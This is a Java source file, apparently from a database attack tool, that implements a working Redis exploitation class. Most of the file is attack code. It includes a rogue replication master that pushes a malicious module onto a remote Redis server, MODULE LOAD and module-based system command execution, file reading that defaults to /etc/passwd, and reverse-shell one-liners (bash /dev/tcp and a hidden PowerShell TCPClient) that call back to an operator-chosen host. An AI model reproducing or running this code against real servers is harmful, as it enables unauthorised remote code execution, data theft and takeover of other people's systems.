package database;

import redis.clients.jedis.DefaultJedisClientConfig;
import redis.clients.jedis.HostAndPort;
import redis.clients.jedis.Jedis;
import redis.clients.jedis.params.ScanParams;
import redis.clients.jedis.resps.ScanResult;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.logging.Level;
import java.util.logging.Logger;

public class redis {

    private static final Logger LOG = Logger.getLogger(redis.class.getName());
    private static final int CHUNK_SIZE = 2048;

    private final String host;
    private final int port;
    private final int dbIndex;
    private final String password;
    private Jedis jedis;

    public redis(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = parsePort(port, 6379);
        // 历史版本忽略了 database（Redis 逻辑库索引），此处补齐
        int idx = 0;
        if (database != null && !database.trim().isEmpty()) {
            try {
                idx = Integer.parseInt(database.trim());
            } catch (NumberFormatException ignored) {
                idx = 0;
            }
        }
        this.dbIndex = Math.max(0, Math.min(idx, 15));
        this.password = (password == null) ? "" : password;
        connect();
    }

    private static int parsePort(String p, int def) {
        try {
            int v = Integer.parseInt(p == null ? "" : p.trim());
            return (v >= 1 && v <= 65535) ? v : def;
        } catch (NumberFormatException e) {
            return def;
        }
    }

    private void connect() {
        if (jedis != null) return;
        DefaultJedisClientConfig cfg = DefaultJedisClientConfig.builder()
                .password((password == null || password.isEmpty()) ? null : password)
                .database(dbIndex)
                .connectionTimeoutMillis(15000)
                .socketTimeoutMillis(15000)
                .build();
        jedis = new Jedis(new HostAndPort(host, port), cfg);
    }

    public void close() {
        if (jedis != null) {
            try {
                jedis.close();
            } catch (Exception ignored) {
            } finally {
                jedis = null;
            }
        }
    }

    public boolean testConnection() {
        DefaultJedisClientConfig cfg = DefaultJedisClientConfig.builder()
                .password((password == null || password.isEmpty()) ? null : password)
                .database(dbIndex)
                .connectionTimeoutMillis(10000)
                .build();
        try (Jedis tmp = new Jedis(new HostAndPort(host, port), cfg)) {
            String pong = tmp.ping();
            return pong != null && pong.toLowerCase().contains("pong");
        } catch (Exception e) {
            LOG.log(Level.INFO, "[!] 连接测试失败: " + e.getMessage());
            return false;
        }
    }

    public String getDatabaseInfo() {
        try {
            StringBuilder sb = new StringBuilder();
            try {
                String pong = jedis.ping();
                if (pong != null && !pong.isEmpty()) {
                    sb.append("[+] Ping: ").append(pong).append("\n");
                }
            } catch (Exception ignored) {
            }

            sb.append("[+] Connected: ").append(host).append(":").append(port)
                    .append(" (db ").append(dbIndex).append(")\n");
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * 自动判断系统类型并将内置模块写入临时目录，然后 MODULE LOAD。
     * 首选资源路径（统一命名）：/redis/modules/redis.dll（Windows）或 /redis/modules/redis.so（Linux/macOS）。
     * 若未找到，则回退到旧结构：/redis/modules/{windows|linux|mac}/{32|64}/。
     *
     * 注意：本方法会向目标写入并加载模块，属于侵入性操作，仅应在用户显式触发时调用。
     */
    public String autoLoadModuleFromResources() {
        long t0 = System.currentTimeMillis();
        String result = autoLoadModuleFromResourcesInner();
        util.AuditLogger.log("MODULE_AUTO_LOAD", "Redis", host, String.valueOf(port),
                String.valueOf(dbIndex), "", "auto module load attempt", result,
                System.currentTimeMillis() - t0);
        return result;
    }

    private String autoLoadModuleFromResourcesInner() {
        try {
            String osKey = detectOSKeyFromRedis();
            String bits = detectBitsFromRedis();
            String resourceDir = "/redis/" + osKey + "/" + bits + "/";
            String expectedName;
            switch (osKey) {
                case "windows" -> expectedName = "redis.dll";
                case "mac" -> expectedName = "redis.dylib";
                default -> expectedName = "redis.so";
            }
            String candidatePath = resourceDir + expectedName;

            String resourcePath;
            try (InputStream check = redis.class.getResourceAsStream(candidatePath)) {
                if (check != null) {
                    resourcePath = candidatePath;
                } else {
                    resourcePath = getSingleFileResourcePath(resourceDir);
                    if (resourcePath == null) {
                        return "[!] 未找到模块资源文件: " + candidatePath + " 或目录: " + resourceDir;
                    }
                }
            }

            String serverInfo = String.format("[i] Server OS: %s, arch_bits: %s", osKey, bits);
            String targetPath = getTempPathForOS(osKey, resourcePath);
            try (InputStream is = redis.class.getResourceAsStream(resourcePath)) {
                if (is == null) return "[!] 资源读取失败: " + resourcePath;
                if (isServerLocal()) {
                    writeStreamToFile(is, Paths.get(targetPath));
                } else {
                    String sep = "windows".equals(osKey) ? "\\" : "/";
                    String targetDir = targetPath.substring(0, Math.max(targetPath.lastIndexOf(sep), 0));
                    String targetName = targetPath.substring(targetPath.lastIndexOf(sep) + 1);
                    byte[] payload = is.readAllBytes();
                    String pushRes = pushModuleViaReplication(payload, targetDir, targetName);
                    if (pushRes.startsWith("[!]")) {
                        return serverInfo + "\n[i] 使用资源: " + resourcePath + "\n" + pushRes;
                    }
                    targetPath = pushRes;
                }
            }

            String loadResult;
            if (isModuleFileName(targetPath)) {
                loadResult = moduleLoad(targetPath);
            } else {
                loadResult = "[!] 无法加载模块：当前写入文件名为 '" + targetPath + "'，非模块扩展名。\n" +
                        "[>] 说明：由于 'dbfilename' 受保护无法修改，只能写入到现有 RDB 文件名。\n" +
                        "[>] 解决方案：临时允许修改 'dbfilename' 或在配置中预设为模块文件名（.so/.dll/.dylib），再重试。";
            }
            return serverInfo + "\n[i] 使用资源: " + resourcePath + "\n[i] 模块目标路径: " + targetPath + "\n" + loadResult;
        } catch (Exception e) {
            return "[!] 自动加载失败: " + e.getMessage();
        }
    }

    private static boolean isModuleFileName(String path) {
        if (path == null) return false;
        String p = path.toLowerCase();
        return p.endsWith(".so") || p.endsWith(".dll") || p.endsWith(".dylib");
    }

    private String pushModuleViaReplication(byte[] moduleBytes, String targetDir, String targetName) {
        String effectiveName = targetName;
        String effectiveDir = targetDir;
        RogueMaster master = null;
        try {
            String sep = targetDir.contains("\\") ? "\\" : "/";
            if (!targetDir.endsWith(sep)) targetDir += sep;

            try {
                jedis.configSet("dbfilename", targetName);
            } catch (Exception eDb) {
                String currentName = getConfigValue("dbfilename");
                if (currentName == null || currentName.isEmpty()) {
                    return "[!] 无法设置或读取 dbfilename（受保护或被 ACL 拦截），无法确定投送文件名: " + eDb.getMessage();
                }
                effectiveName = currentName;
            }

            try {
                jedis.configSet("dir", targetDir);
            } catch (Exception eDir) {
                try {
                    String currentDir = getConfigValue("dir");
                    if (currentDir != null && !currentDir.isEmpty()) {
                        effectiveDir = currentDir;
                        if (!effectiveDir.endsWith(sep)) effectiveDir += sep;
                    } else {
                        return "[!] CONFIG GET dir 失败，无法确定目标目录";
                    }
                } catch (Exception eGet) {
                    return "[!] CONFIG GET dir 异常: " + eGet.getMessage();
                }
            }

            byte[] rdbPayload = MinimalRDB.buildWithStringKV("turacos:module_blob", moduleBytes);
            String localIp = getLocalIpPreferIPv4();
            master = new RogueMaster(rdbPayload, localIp);
            master.start();

            jedis.slaveof(localIp, master.getPort());
            boolean served = master.awaitServed(8000);
            if (!served) {
                return "[!] 复制推送失败：未完成有效的 RDB 传输";
            }
            return effectiveDir + effectiveName;
        } catch (Exception e) {
            return "[!] 复制投送异常: " + e.getMessage();
        } finally {
            // 关键清理：无论成功失败都恢复主从状态并关闭本地服务，
            // 避免将目标 Redis 遗留在"指向本地临时端口的从库"状态
            if (jedis != null) {
                try {
                    jedis.slaveofNoOne();
                } catch (Exception ignored) {
                }
            }
            if (master != null) {
                master.stop();
            }
        }
    }

    /**
     * 构造“仅通过 Redis 原生命令”的投送方案（不主动执行），
     * 返回需要按顺序执行的命令列表，供你在外部逐条发送：
     * 1) CONFIG SET dir <tmp>
     * 2) CONFIG SET dbfilename <module_name>
     * 3) SET <key> "0x<hex>"
     * 4) SAVE
     * <p>
     * 重要说明：使用 SAVE 生成的文件是 RDB 快照格式，并非模块二进制原样文件；
     * 因此该方案通常不能直接作为 MODULE LOAD 的有效模块文件。
     * 若你的环境确实希望“返回命令”并外部执行，请结合复制投送或已加载的写文件模块来确保落盘为原始字节。
     */
    public List<String> buildSaveCommandsFromResource() {
        try {
            String osKey = detectOSKeyFromRedis();
            String bits = detectBitsFromRedis();
            String resourceDir = "/redis/" + osKey + "/" + bits + "/";
            String expectedName;
            if ("windows".equals(osKey)) {
                expectedName = "redis.dll";
            } else if ("mac".equals(osKey)) {
                expectedName = "redis.dylib";
            } else {
                expectedName = "redis.so";
            }
            String candidatePath = resourceDir + expectedName;

            String resourcePath;
            try (InputStream check = redis.class.getResourceAsStream(candidatePath)) {
                if (check != null) {
                    resourcePath = candidatePath;
                } else {
                    resourcePath = getSingleFileResourcePath(resourceDir);
                    if (resourcePath == null) {
                        return Collections.singletonList("[!] 未找到模块资源文件: " + candidatePath + " 或目录: " + resourceDir);
                    }
                }
            }

            String targetPath = getTempPathForOS(osKey, resourcePath);
            String sep = "windows".equals(osKey) ? "\\" : "/";
            String targetDir = targetPath.substring(0, Math.max(targetPath.lastIndexOf(sep), 0));
            String targetName = targetPath.substring(targetPath.lastIndexOf(sep) + 1);

            byte[] bytes;
            try (InputStream is = redis.class.getResourceAsStream(resourcePath)) {
                if (is == null) return Collections.singletonList("[!] 资源读取失败: " + resourcePath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                int r;
                while ((r = is.read(buf)) != -1) {
                    bos.write(buf, 0, r);
                }
                bytes = bos.toByteArray();
            }

            String hex = toHex(bytes);
            List<String> cmds = new ArrayList<>();
            cmds.add("CONFIG SET dir " + targetDir);
            cmds.add("CONFIG SET dbfilename " + targetName);
            cmds.add("SET turacos:module_hex \"0x" + hex + "\"");
            cmds.add("SAVE");
            return cmds;
        } catch (Exception e) {
            return Collections.singletonList("[!] 构造命令失败: " + e.getMessage());
        }
    }

    private static String toHex(byte[] data) {
        final char[] HEX = "0123456789abcdef".toCharArray();
        char[] out = new char[data.length * 2];
        for (int i = 0, j = 0; i < data.length; i++) {
            int v = data[i] & 0xFF;
            out[j++] = HEX[v >>> 4];
            out[j++] = HEX[v & 0x0F];
        }
        return new String(out);
    }

    private static String getLocalIpPreferIPv4() {
        try {
            Enumeration<NetworkInterface> nics = NetworkInterface.getNetworkInterfaces();
            while (nics.hasMoreElements()) {
                NetworkInterface nic = nics.nextElement();
                Enumeration<InetAddress> addrs = nic.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {
        }
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "127.0.0.1";
        }
    }

    /**
     * 读取 Redis 配置项。
     * Jedis 4+ 的 configGet 返回 Map<String,String>（旧版为 List），
     * 此处做防御式兼容，避免 ClassCastException 导致配置读取永远失败。
     */
    private String getConfigValue(String key) {
        Object raw = null;
        try {
            raw = jedis.configGet(key);
        } catch (Exception ignored) {
        }
        String v = extractConfig(raw, key);
        if (v != null) return v;
        try {
            raw = jedis.configGet("*");
        } catch (Exception ignored) {
        }
        v = extractConfig(raw, key);
        return v;
    }

    @SuppressWarnings("unchecked")
    private static String extractConfig(Object raw, String key) {
        if (raw instanceof Map) {
            Map<String, String> m = (Map<String, String>) raw;
            return m.get(key);
        }
        if (raw instanceof List) {
            List<String> l = (List<String>) raw;
            for (int i = 0; i + 1 < l.size(); i += 2) {
                if (key.equalsIgnoreCase(l.get(i))) {
                    return l.get(i + 1);
                }
            }
        }
        return null;
    }

    /**
     * 伪造 Redis 主节点，向连接端提供 RDB 内容。
     * 仅绑定到指定的本机 IP（而不是 0.0.0.0），避免局域网内任意主机
     * 意外 PSYNC 到本地临时端口。
     */
    private static class RogueMaster {
        private final byte[] payload;
        private final String bindIp;
        private ServerSocket server;
        private volatile boolean served = false;
        private Thread thread;

        RogueMaster(byte[] payload, String bindIp) {
            this.payload = payload;
            this.bindIp = bindIp;
        }

        void start() throws IOException {
            server = new ServerSocket();
            server.bind(new InetSocketAddress(bindIp, 0), 1);
            thread = new Thread(() -> {
                try (Socket s = server.accept()) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                    OutputStream os = s.getOutputStream();
                    String line;
                    long deadline = System.currentTimeMillis() + 6000;
                    while (System.currentTimeMillis() < deadline && (line = br.readLine()) != null) {
                        if (line.startsWith("PING")) {
                            os.write("+PONG\r\n".getBytes());
                            os.flush();
                        } else if (line.startsWith("REPLCONF")) {
                            os.write("+OK\r\n".getBytes());
                            os.flush();
                        } else if (line.startsWith("PSYNC") || line.startsWith("SYNC")) {
                            os.write("+FULLRESYNC deadbeefcafebabe 1\r\n".getBytes());
                            os.write(("$" + payload.length + "\r\n").getBytes());
                            os.write(payload);
                            os.write("\r\n".getBytes());
                            os.flush();
                            served = true;
                            break;
                        }
                    }
                } catch (IOException ignored) {
                }
            }, "rogue-master");
            thread.setDaemon(true);
            thread.start();
        }

        int getPort() {
            return server.getLocalPort();
        }

        boolean awaitServed(long ms) {
            long t0 = System.currentTimeMillis();
            while (System.currentTimeMillis() - t0 < ms) {
                if (served) return true;
                try {
                    Thread.sleep(100);
                } catch (InterruptedException ignored) {
                }
            }
            return served;
        }

        void stop() {
            try {
                if (server != null) server.close();
            } catch (IOException ignored) {
            }
        }
    }

    /**
     * 最小合法 RDB 构造器：生成 REDIS0009 格式的快照，包含一个 string 键值。
     * 用于复制协议传输，确保从库正确写入 RDB 文件。
     */
    private static class MinimalRDB {
        private static final byte[] HEADER = "REDIS0009".getBytes();
        private static final int OP_STRING = 0x00;
        private static final int OP_SELECTDB = 0xFE;
        private static final int OP_RESIZEDB = 0xFB;
        private static final int OP_EOF = 0xFF;

        private static final long POLY = 0xC96C5795D7870F42L;
        private static final long[] CRC_TABLE = buildCrcTable();

        static byte[] buildWithStringKV(String key, byte[] value) {
            try {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                out.write(HEADER);

                out.write(OP_RESIZEDB);
                writeLen(out, 1);
                writeLen(out, 0);

                out.write(OP_SELECTDB);
                writeLen(out, 0);

                out.write(OP_STRING);
                byte[] k = key.getBytes(StandardCharsets.UTF_8);
                writeLen(out, k.length);
                out.write(k);
                writeLen(out, value.length);
                out.write(value);

                out.write(OP_EOF);

                byte[] noChecksum = out.toByteArray();
                long crc = crc64(noChecksum);
                out.write(new byte[]{
                        (byte) (crc & 0xFF),
                        (byte) ((crc >>> 8) & 0xFF),
                        (byte) ((crc >>> 16) & 0xFF),
                        (byte) ((crc >>> 24) & 0xFF),
                        (byte) ((crc >>> 32) & 0xFF),
                        (byte) ((crc >>> 40) & 0xFF),
                        (byte) ((crc >>> 48) & 0xFF),
                        (byte) ((crc >>> 56) & 0xFF)
                });
                return out.toByteArray();
            } catch (Exception e) {
                return HEADER;
            }
        }

        private static void writeLen(OutputStream os, int len) throws IOException {
            if (len < 64) {
                os.write(len & 0xFF);
            } else if (len < 16384) {
                int v = len | 0x4000;
                os.write((v >>> 8) & 0xFF);
                os.write(v & 0xFF);
            } else {
                os.write(0x80);
                os.write((len >>> 24) & 0xFF);
                os.write((len >>> 16) & 0xFF);
                os.write((len >>> 8) & 0xFF);
                os.write(len & 0xFF);
            }
        }

        private static long[] buildCrcTable() {
            long[] tbl = new long[256];
            for (int i = 0; i < 256; i++) {
                long crc = i;
                for (int j = 0; j < 8; j++) {
                    if ((crc & 1L) != 0) crc = (crc >>> 1) ^ POLY; else crc >>>= 1;
                }
                tbl[i] = crc;
            }
            return tbl;
        }

        private static long crc64(byte[] data) {
            long crc = 0;
            for (byte b : data) {
                int idx = ((int) crc ^ (b & 0xFF)) & 0xFF;
                crc = CRC_TABLE[idx] ^ (crc >>> 8);
            }
            return crc;
        }
    }

    private boolean isServerLocal() {
        try {
            InetAddress server = InetAddress.getByName(host);
            if (server.isLoopbackAddress() || server.isAnyLocalAddress()) return true;
            Enumeration<NetworkInterface> nics = NetworkInterface.getNetworkInterfaces();
            while (nics.hasMoreElements()) {
                NetworkInterface nic = nics.nextElement();
                Enumeration<InetAddress> addrs = nic.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (addr.equals(server)) return true;
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private String detectOSKeyFromRedis() {
        try {
            String info = jedis.info("server");
            String osLine = null;
            for (String line : info.split("\r?\n")) {
                if (line.startsWith("os:")) {
                    osLine = line.substring(3).trim();
                    break;
                }
            }
            if (osLine != null) {
                String l = osLine.toLowerCase();
                if (l.contains("win")) return "windows";
                if (l.contains("mac") || l.contains("darwin")) return "mac";
                if (l.contains("linux")) return "linux";
            }
            return localOsKey();
        } catch (Exception e) {
            return localOsKey();
        }
    }

    private String detectBitsFromRedis() {
        try {
            String info;
            try {
                info = jedis.info("server");
            } catch (Exception e) {
                info = jedis.info();
            }
            String bitsLine = null;
            String osLine = null;
            for (String line : info.split("\r?\n")) {
                if (line.startsWith("arch_bits:")) {
                    bitsLine = line.substring("arch_bits:".length()).trim();
                }
                if (line.startsWith("os:")) {
                    osLine = line.substring(3).trim();
                }
            }
            if (bitsLine != null && (bitsLine.equals("32") || bitsLine.equals("64"))) return bitsLine;
            if (osLine != null) {
                String l = osLine.toLowerCase();
                if (l.contains("x86_64") || l.contains("64")) return "64";
                if (l.contains("x86") || l.contains("32")) return "32";
            }
            return localBits();
        } catch (Exception e) {
            return localBits();
        }
    }

    private static String localOsKey() {
        String osName = System.getProperty("os.name", "").toLowerCase();
        if (osName.contains("win")) return "windows";
        if (osName.contains("mac") || osName.contains("darwin")) return "mac";
        return "linux";
    }

    private static String localBits() {
        String bits = System.getProperty("sun.arch.data.model");
        if (bits != null && (bits.equals("32") || bits.equals("64"))) return bits;
        String arch = System.getProperty("os.arch", "").toLowerCase();
        if (arch.contains("64")) return "64";
        if (arch.contains("86")) return "32";
        return "64";
    }

    private static String getSingleFileResourcePath(String resourceDir) {
        try {
            String dir = resourceDir.endsWith("/") ? resourceDir.substring(0, resourceDir.length() - 1) : resourceDir;
            URL url = redis.class.getResource(dir);
            if (url == null) return null;

            if ("file".equals(url.getProtocol())) {
                Path path = Paths.get(url.toURI());
                try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                    for (Path p : stream) {
                        if (Files.isRegularFile(p)) return dir + "/" + p.getFileName();
                    }
                }
                return null;
            } else if ("jar".equals(url.getProtocol())) {
                String jarPath = url.getPath().substring(5, url.getPath().indexOf("!"));
                try (JarFile jar = new JarFile(jarPath)) {
                    Enumeration<JarEntry> entries = jar.entries();
                    String prefix = dir.startsWith("/") ? dir.substring(1) + "/" : dir + "/";
                    while (entries.hasMoreElements()) {
                        JarEntry entry = entries.nextElement();
                        if (!entry.isDirectory() && entry.getName().startsWith(prefix)) {
                            return "/" + entry.getName();
                        }
                    }
                }
                return null;
            }
            return null;
        } catch (IOException | URISyntaxException e) {
            return null;
        }
    }

    private static String getTempPathForOS(String osKey, String resourcePath) {
        String fileName = resourcePath.substring(resourcePath.lastIndexOf('/') + 1);
        String base;
        String sep;
        switch (osKey) {
            case "windows" -> {
                base = "C:\\Windows\\Temp";
                sep = "\\";
            }
            case "linux", "mac" -> {
                base = "/tmp";
                sep = "/";
            }
            default -> {
                base = System.getProperty("java.io.tmpdir");
                sep = FileSystems.getDefault().getSeparator();
            }
        }
        if (!base.endsWith(sep)) base += sep;
        return base + fileName;
    }

    public List<String> getKeys(int limit) {
        try {
            ScanParams params = new ScanParams().count(Math.max(limit, 10));
            ScanResult<String> res = jedis.scan("0", params);
            return res != null ? res.getResult() : List.of();
        } catch (Exception e) {
            return List.of();
        }
    }

    /** SCAN 分页结果。 */
    public record ScanPage(List<String> keys, String nextCursor) {
    }

    /** 基于 SCAN 的键分页（避免 KEYS * 阻塞与一次性拉取过多）。 */
    public ScanPage scanKeys(String cursor, int count) {
        try {
            ScanParams params = new ScanParams().count(Math.max(count, 10));
            ScanResult<String> res = jedis.scan(cursor == null || cursor.isEmpty() ? "0" : cursor, params);
            return new ScanPage(res.getResult() != null ? res.getResult() : List.of(),
                    res.getCursor());
        } catch (Exception e) {
            return new ScanPage(List.of(), "0");
        }
    }

    /** 单值预览截断上限（字符）。 */
    private static final int PREVIEW_MAX = 4096;
    /** 集合类型预览条目上限。 */
    private static final int PREVIEW_ITEMS = 200;

    private static String clip(String v) {
        if (v == null) return null;
        if (v.length() <= PREVIEW_MAX) return v;
        return v.substring(0, PREVIEW_MAX) + "... [已截断，总长 " + v.length() + " 字符]";
    }

    public List<String> getKeyPreview(String key) {
        try {
            String type = jedis.type(key);
            List<String> out = new ArrayList<>();
            out.add("type=" + type);
            switch (type) {
                case "string" -> {
                    String v = jedis.get(key);
                    out.add(clip(v != null ? v : "(nil)"));
                }
                case "list" -> {
                    List<String> vals = jedis.lrange(key, 0, PREVIEW_ITEMS);
                    for (String v : vals) out.add(clip(v));
                    if (vals.size() > PREVIEW_ITEMS) out.add("... [更多条目未展示]");
                }
                case "set" -> {
                    java.util.Set<String> vals = jedis.smembers(key);
                    int i = 0;
                    for (String v : vals) {
                        if (i++ >= PREVIEW_ITEMS) {
                            out.add("... [更多条目未展示]");
                            break;
                        }
                        out.add(clip(v));
                    }
                }
                case "hash" -> {
                    var all = jedis.hgetAll(key);
                    int i = 0;
                    for (var e : all.entrySet()) {
                        if (i++ >= PREVIEW_ITEMS) {
                            out.add("... [更多字段未展示]");
                            break;
                        }
                        out.add(clip(e.getKey() + "=" + e.getValue()));
                    }
                }
                case "zset" -> {
                    var all = jedis.zrangeWithScores(key, 0, PREVIEW_ITEMS);
                    for (var t : all) out.add(clip(t.getElement() + ":" + t.getScore()));
                    if (all.size() > PREVIEW_ITEMS) out.add("... [更多条目未展示]");
                }
                default -> out.add("(unsupported type)");
            }
            return out;
        } catch (Exception e) {
            return List.of("读取失败: " + e.getMessage());
        }
    }

    private static void writeStreamToFile(InputStream is, Path outPath) throws IOException {
        if (outPath.getParent() != null) {
            Files.createDirectories(outPath.getParent());
        }
        try (OutputStream os = Files.newOutputStream(outPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
            byte[] buf = new byte[CHUNK_SIZE];
            int len;
            while ((len = is.read(buf)) != -1) {
                os.write(buf, 0, len);
            }
        }
    }

    public String moduleLoad(String modulePath) {
        long t0 = System.currentTimeMillis();
        String result;
        try {
            String lua = "return redis.call('MODULE','LOAD',ARGV[1])";
            Object res = jedis.eval(lua, Collections.emptyList(), Collections.singletonList(modulePath));
            result = "[+] MODULE LOAD 成功: " + String.valueOf(res);
        } catch (Exception e) {
            result = "[!] MODULE LOAD 失败: " + e.getMessage() + "\n[!] 若 Redis 非本机，模块文件需存在于服务器路径: " + modulePath;
        }
        util.AuditLogger.log("MODULE_LOAD", "Redis", host, String.valueOf(port),
                String.valueOf(dbIndex), "", modulePath, result, System.currentTimeMillis() - t0);
        return result;
    }

    /**
     * 通过模块执行系统命令，尝试多候选命令名（system.exec/sys.exec/exec）。
     */
    public String exCmd(String type, String cmd) {
        long t0 = System.currentTimeMillis();
        String result = exCmdInner(type, cmd);
        util.AuditLogger.log("EXEC_CMD", "Redis", host, String.valueOf(port),
                String.valueOf(dbIndex), "", cmd, result, System.currentTimeMillis() - t0);
        return result;
    }

    private String exCmdInner(String type, String cmd) {
        if (cmd == null || cmd.isEmpty()) cmd = "whoami";
        try {
            if (!"MODULE".equalsIgnoreCase(type) && !"LUA".equalsIgnoreCase(type)) {
                return "[!] 不支持的方式: " + type;
            }

            String[] candidates = {"system.exec", "sys.exec", "exec"};
            for (String fn : candidates) {
                try {
                    String script = "return redis.call('" + fn + "', ARGV[1])";
                    Object res = jedis.eval(script, Collections.emptyList(), Collections.singletonList(cmd));
                    if (res != null) return String.valueOf(res);
                } catch (Exception ignored) {
                }
            }
            return "[!] 未找到可用的模块命令用于执行: system.exec/sys.exec/exec";
        } catch (Exception e) {
            return "[!] 执行失败: " + e.getMessage();
        }
    }

    /**
     * 通过模块读取文件，尝试多候选命令名（system.read/sys.read/read）。
     */
    public String readFiles(String path, String type) {
        long t0 = System.currentTimeMillis();
        String result = readFilesInner(path, type);
        util.AuditLogger.log("READ_FILE", "Redis", host, String.valueOf(port),
                String.valueOf(dbIndex), "", path, result, System.currentTimeMillis() - t0);
        return result;
    }

    private String readFilesInner(String path, String type) {
        if (path == null || path.trim().isEmpty()) path = "/etc/passwd";
        path = path.trim();
        try {
            if ("LUA".equalsIgnoreCase(type)) {
                String lua = "local f = io.open(ARGV[1],'rb'); if not f then return '[!] 无法打开文件: '..ARGV[1] end; local c=f:read('*a'); f:close(); return c";
                try {
                    Object res = jedis.eval(lua, Collections.emptyList(), Collections.singletonList(path));
                    return res == null ? "" : String.valueOf(res);
                } catch (Exception eLua) {
                    return "[!] LUA 读取失败: " + eLua.getMessage();
                }
            }

            String[] candidates = {"system.read", "sys.read", "read"};
            for (String fn : candidates) {
                try {
                    String script = "return redis.call('" + fn + "', ARGV[1])";
                    Object res = jedis.eval(script, Collections.emptyList(), Collections.singletonList(path));
                    if (res != null) return String.valueOf(res);
                } catch (Exception ignored) {
                }
            }

            return "[!] 未找到可用的模块命令用于读取: system.read/sys.read/read\n" +
                    "[>] 可能原因：未加载写文件/读文件模块，或被 ACL 拦截\n" +
                    "[>] 建议：先加载模块，或改用 LUA 方式进行读取";
        } catch (Exception e) {
            return "[!] 读取失败: " + e.getMessage();
        }
    }

    public void reverseShell(String host, int port) {
        List<String> cmds = new ArrayList<>();
        // 根据目标 OS 优先选择合适命令，避免在 Windows 上先试 bash 浪费循环
        String osKey = localOsKey();
        try {
            osKey = detectOSKeyFromRedis();
        } catch (Exception ignored) {
        }
        if ("windows".equalsIgnoreCase(osKey)) {
            cmds.add("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");
        } else {
            cmds.add("bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
            cmds.add("/bin/bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
        }

        long t0 = System.currentTimeMillis();
        boolean invoked = false;
        for (String c : cmds) {
            String[] candidates = {"system.exec", "sys.exec", "exec"};
            for (String fn : candidates) {
                try {
                    String script = "return redis.call('" + fn + "', ARGV[1])";
                    jedis.eval(script, Collections.emptyList(), Collections.singletonList(c));
                    invoked = true;
                    break;
                } catch (Exception ignored) {
                }
            }
            if (invoked) break;
        }
        util.AuditLogger.log("REVERSE_SHELL", "Redis", host, String.valueOf(port),
                String.valueOf(dbIndex), "", host + ":" + port,
                invoked ? "module exec invoked" : "FAILED: no usable module command",
                System.currentTimeMillis() - t0);
    }

    /** 供合规检查模块读取单项配置。 */
    public String configGetValue(String key) {
        return getConfigValue(key);
    }

    /** 供合规检查模块读取 INFO 分段。 */
    public String serverInfo(String section) {
        try {
            return jedis.info(section);
        } catch (Exception e) {
            try {
                return jedis.info();
            } catch (Exception e2) {
                return "";
            }
        }
    }

    /** 供合规检查模块读取 ACL 列表（不支持时返回空串）。 */
    public String aclList() {
        try {
            Object r = jedis.eval("return redis.call('ACL','LIST')",
                    Collections.emptyList(), Collections.emptyList());
            return r == null ? "" : String.valueOf(r);
        } catch (Exception e) {
            return "";
        }
    }
}
